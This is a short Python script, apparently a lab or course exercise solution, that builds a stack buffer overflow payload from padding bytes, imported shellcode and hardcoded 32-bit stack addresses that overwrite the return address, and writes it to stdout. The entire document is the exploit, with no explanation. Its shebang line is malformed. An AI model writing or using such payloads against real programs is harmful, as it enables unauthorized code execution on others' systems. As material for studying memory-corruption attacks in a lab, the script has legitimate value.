#/bash/bin/python3
import sys
import struct
from shellcode import shellcode
#0xbffef39c
#2064
return_addr = 0xbffef39c
padding = b'A' * (2048 - len(shellcode))
buffer_addr = 0xbffeeb88

payload = padding + shellcode + struct.pack("<I", buffer_addr) + struct.pack("<I", return_addr)

sys.stdout.buffer.write(payload)
